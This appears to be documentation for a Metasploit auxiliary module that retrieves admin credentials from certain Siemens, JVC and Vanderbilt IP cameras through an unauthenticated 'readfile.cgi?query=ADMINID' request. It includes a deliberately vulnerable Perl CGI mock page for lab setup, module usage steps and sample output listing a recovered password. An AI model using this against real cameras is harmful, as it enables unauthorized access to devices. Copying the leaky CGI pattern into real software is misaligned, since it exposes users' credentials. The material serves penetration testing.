## Description

  SIEMENS IP-Camera (CVMS2025-IR + CCMS2025), JVC IP-Camera (VN-T216VPRU),
  and Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR)
  allow an unauthenticated user to disclose the username & password by
  requesting the javascript page 'readfile.cgi?query=ADMINID'.
  Siemens firmwares affected: x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235

## Vulnerable Application

This module has been verified against the mock vulnerable page listed below.

### Mock Vulnerable Page

These instructions will create a cgi environment and a vulnerable perl application for exploitation.
Kali rolling (2019.1) was utilized for this tutorial, with apache.

#### Setup

1. Enable cgi: `a2enmod cgid`
2. `mkdir /var/www/html/cgi-bin`
3. Enable folder for cgi execution: add `ScriptAlias "/cgi-bin/" "/var/www/html/cgi-bin/"` to `/etc/apache2/sites-enabled/000-default.conf ` inside of the `VirtualHost` tags
4. Create the vulnerable page by writing the following text to `/var/www/html/cgi-bin/readfile.cgi`:

```
#!/usr/bin/perl
use CGI qw(:standard);
$query = new CGI;
print $query->header( -type=> "text/javascript"),
$query->import_names( 'Q' );
my $data = <<'DATA';
var pw_enflag = "1";
var pw_adminpw = "12345";
var pw_retype1 = "12345";
var pw_userpw = "56789";
var pw_retype2 = "56789";
var pw_autolock = "0";
DATA
if ($Q::page == 2) {
  print $data;
}
```

## Verification Steps

1. Start msfconsole
2. ```use auxiliary/gather/ipcamera_password_disclosure```
3. ```set rhosts [rhosts]```
4. ```run```

## Scenarios

### Against the Mock page listed above

  ```
  msf5 > use auxiliary/gather/ipcamera_password_disclosure 
  msf5 auxiliary(gather/ipcamera_password_disclosure) > set rhosts 127.0.0.1
  rhosts => 127.0.0.1
  msf5 auxiliary(gather/ipcamera_password_disclosure) > run
  
  [+] Found: admin:password
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```
